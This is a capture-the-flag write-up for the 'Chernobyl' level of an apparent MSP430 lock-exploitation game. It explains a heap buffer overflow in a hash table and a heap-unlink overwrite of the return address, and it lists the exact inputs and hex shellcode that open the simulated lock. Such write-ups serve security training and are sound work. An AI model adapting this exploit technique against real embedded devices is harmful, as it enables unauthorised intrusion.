# Chernobyl
## TLDR
A hash table on the heap stores user names and pin numbers.  
When the hash table is full (initially 10 entries) it will double in size.  
The program is vulnerable to a heap buffer overflow in the hash table.  
A heap unlink exploit is used to overwrite the main function return address during a call to free.  
Shellcode instructions that will call INT on interrupt 0x7f will be executed from the stack.  

## Details
The LockIT Pro d.02  is the first of a new series  of locks. It is
controlled by a  MSP430 microcontroller, and is  the most advanced
MCU-controlled lock available on the  market. The MSP430 is a very
low-power device which allows the LockIT  Pro to run in almost any
environment.

The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
be inaccessable from the exterior of the building.

LockIT Pro Account Manager solves the problem of sharing passwords
when  multiple users  must  have  access to  a  lock. The  Account
Manager contains  a mapping of users  to PINs, each of  which is 4
digits.  The  system supports  hundreds of users,  each configured
with his or her own PIN,  without degrading the performance of the
manager.

There are no accounts set up  on the LockIT Pro Account Manager by
default. An administrator must first initialize the lock with user
accounts  and  their  PINs.  User  accounts  are  by  default  not
authorized  for access,  but can  be authorized  by attaching  the
Account  Manager  Authorizer.  This  prevents  users  from  adding
themselves to the lock during its use.
    
This is Hardware  Version D.  It contains  the Bluetooth connector
built in, and one available port, to which the LockIT Pro Deadbolt
should be connected. When authorizing PINs, the Deadbolt should be
disconnected and the Authorizer should be attached in its place.

This   is  Software   Revision   02.  It   contains  the   all-new
vault-manager software.

## Solution
* available commands are "access" and "new". Anything else will cause run function to return and exit program
* The hash table is stored on the heap
* each block can only hold 5 entries but 10 can be added before the table is expanded
* nulls and spaces (0x20) will be filtered from user input before being moved to heap
* malloc calls in rehash function need to still work. This means forward direction (next node) in linked list must be intact
* free calls will use the previous node to combine free regions of memory. Use this to overwrite return address back to main using buffer sizes
* overwrite return address with stack address when input read from user.
* on next user input after rehash function, store shellcode on stack that will call interrupt 0x7f
* pass in a bad character (not "a" or "n") to return from run function

Meta data for each hash table starts at address  

Address for each table: 0x5016 - 0x5025  
Size for each table: 0x502e - 503d  

8 Entries in the table, each 0x5a (90) bytes long  
Start of each hash table:
* 0x5042
* 0x50a2
* 0x5102
* 0x5162
* 0x51c2
* 0x5222
* 0x5282
* 0x52e2

Check first byte of user input
* 0x61  -  access [your name] [pin]
* 0x6e  -  new [your name] [pin]


## Answer
Input: (ascii) new AAAAAAAAAAAAAAAA 0  
Input: (ascii) new AAAAAAAAAAAAAAAA 1  
Input: (ascii) new AAAAAAAAAAAAAAAA 2  
Input: (ascii) new AAAAAAAAAAAAAAAA 3  
Input: (ascii) new AAAAAAAAAAAAAAAA 4  
Input: (hex) 6e657720 f243 fc50 51f5 31 2030  
Input: (ascii) new A 0  
Input: (ascii) new B 0  
Input: (ascii) new C 0  
Input: (ascii) new D 0  
Input: (ascii) new E 0  
Input: (ascii) new F 0  
Input: (hex) 42424242 324000ffb0121000  
